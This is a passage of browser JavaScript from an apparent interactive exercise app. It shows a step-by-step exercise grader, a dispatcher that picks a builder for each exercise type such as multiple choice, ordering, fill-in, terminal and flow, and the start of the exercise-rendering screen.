        st.step += 1;
        renderStep();
      });
      list.appendChild(b);
    });
    holder.appendChild(list);
  }
  renderStep();
  return {
    grade: function () {
      var H = 0, W = 0, N = steps.length, fb = [];
      steps.forEach(function (s, i) {
        var ch = st.choices[i];
        var right = null;
        s.options.forEach(function (o) { if (o.correct) { right = o; } });
        if (ch && ch.correct) {
          H++; fb.push({ state: 'correct', label: 'Step ' + (i + 1) + ': ' + ch.t, why: ch.why });
        } else {
          W++; fb.push({
            state: 'wrong',
            label: 'Step ' + (i + 1) + ': ' + (ch ? ch.t : '(no choice)'),
            why: (ch ? ch.why + ' ' : '') + 'Better: ' + right.t + ' — ' + right.why
          });
        }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

function buildWidget(ex, root, checkBtn) {
  if (ex.type === 'qcm') { return buildQcm(ex, root, checkBtn, false); }
  if (ex.type === 'qcm-multi') { return buildQcm(ex, root, checkBtn, true); }
  if (ex.type === 'match' || ex.type === 'categorize') { return buildPlace(ex, root, checkBtn); }
  if (ex.type === 'order') { return buildOrder(ex, root, checkBtn); }
  if (ex.type === 'fill') { return buildFill(ex, root, checkBtn); }
  if (ex.type === 'rank') { return buildRank(ex, root, checkBtn); }
  if (ex.type === 'terminal') { return buildTerminal(ex, root, checkBtn); }
  if (ex.type === 'flow') { return buildFlow(ex, root, checkBtn); }
  return buildQcm(ex, root, checkBtn, false);
}

/* ---------------- exercise screen ---------------- */
function renderExercise() {

  S.checked = false;

  var stage = $('#stage');
  stage.innerHTML = '';
  if (S.notice) { stage.appendChild(el('div', 'notice', esc(S.notice))); S.notice = null; }

  /* SCENARIO */
